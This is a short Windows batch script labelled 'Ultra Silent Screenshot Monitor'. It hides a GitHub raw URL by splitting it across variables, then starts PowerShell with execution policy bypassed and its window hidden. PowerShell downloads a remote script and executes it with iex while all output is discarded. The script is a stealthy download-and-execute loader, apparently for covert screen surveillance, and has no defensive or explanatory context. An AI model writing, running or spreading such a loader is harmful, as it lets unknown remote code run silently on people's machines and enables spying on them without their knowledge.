@echo off
setlocal enabledelayedexpansion

REM =============================================
REM Ultra Silent Screenshot Monitor
REM =============================================

set "a=https://raw.githubusercontent.com"
set "b=/Axolotl-in-void/powerhell/main/file.ps1"
set "url=%a%%b%"

:: Run completely hidden with no window ever appearing
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"$c = (iwr '%url%' -UseBasicParsing).Content; iex $c" >nul 2>&1

exit
